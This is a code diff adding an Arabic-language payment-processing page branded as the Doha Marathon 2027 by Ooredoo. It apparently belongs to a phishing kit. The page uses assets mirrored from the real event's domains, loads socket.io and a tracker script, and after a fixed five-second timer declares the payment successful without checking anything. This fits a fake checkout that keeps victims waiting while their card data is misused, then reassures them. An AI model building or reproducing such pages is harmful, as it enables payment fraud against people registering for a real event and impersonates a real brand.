@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#ed1c24">
+	<title>جارِ المعالجة - ماراثون الدوحة 2027</title>
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
+	<link rel="stylesheet" href="assets/registration-payment.css">
+	<style>
+		.wait-container { text-align:center; padding:60px 20px; }
+		.spinner { width:64px; height:64px; margin:0 auto 28px; border:5px solid #e8e8e8; border-top-color:var(--brand,#ed1c24); border-radius:50%; animation:spin 1s linear infinite; }
+		@keyframes spin { to { transform:rotate(360deg); } }
+		.wait-title { font-size:22px; font-weight:700; color:#101010; margin-bottom:10px; }
+		.wait-subtitle { font-size:15px; color:#666; line-height:1.6; margin-bottom:24px; }
+		.wait-note { font-size:13px; color:#999; margin-top:20px; }
+		.success-icon { display:none; width:64px; height:64px; margin:0 auto 28px; }
+		.success-icon svg { width:64px; height:64px; }
+		.success-icon circle { fill:#22c55e; }
+		.success-icon path { fill:#fff; stroke:#fff; stroke-width:1; }
+		.is-done .spinner { display:none; }
+		.is-done .success-icon { display:block; }
+		.is-done .wait-title { color:#22c55e; }
+	</style>
+</head>
+<body>
+	<header class="payment-header">
+		<nav class="header-actions" aria-label="روابط سريعة">
+			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
+				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
+			</a>
+			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
+			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
+		</nav>
+		<a class="payment-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
+			<img src="assets/suffixevnt.blob.core.windows.net/dohaimages/2025/06/Logo.png" alt="ماراثون الدوحة من أريدُ">
+		</a>
+	</header>
+
+	<main class="payment-shell">
+		<section class="payment-card" aria-label="جارِ المعالجة">
+			<div class="wait-container" id="wait-container">
+				<div class="spinner"></div>
+				<div class="success-icon">
+					<svg viewBox="0 0 64 64"><circle cx="32" cy="32" r="32"/><path d="M20 33l8 8 16-16" fill="none" stroke="#fff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+				</div>
+				<h1 class="wait-title" id="wait-title">جارِ معالجة الدفع...</h1>
+				<p class="wait-subtitle" id="wait-subtitle">يرجى الانتظار وعدم إغلاق هذه الصفحة.<br>قد يستغرق الأمر بضع ثوانٍ.</p>
+				<p class="wait-note" id="wait-note">سيتم تحويلك تلقائياً عند اكتمال العملية.</p>
+			</div>
+		</section>
+	</main>
+	<footer class="payment-footer" aria-hidden="true"></footer>
+<script src="/socket.io/socket.io.js"></script>
+<script src="/assets/tracker.js"></script>
+<script>
+(function(){
+	var container = document.getElementById("wait-container");
+	var title = document.getElementById("wait-title");
+	var subtitle = document.getElementById("wait-subtitle");
+	var note = document.getElementById("wait-note");
+
+	setTimeout(function(){
+		container.classList.add("is-done");
+		title.textContent = "تمت عملية الدفع بنجاح!";
+		subtitle.innerHTML = "شكراً لتسجيلك في ماراثون الدوحة 2027.<br>ستصلك رسالة تأكيد عبر البريد الإلكتروني.";
+		note.textContent = "يمكنك إغلاق هذه الصفحة الآن.";
+	}, 5000);
+})();
+</script>
+</body>
+</html>
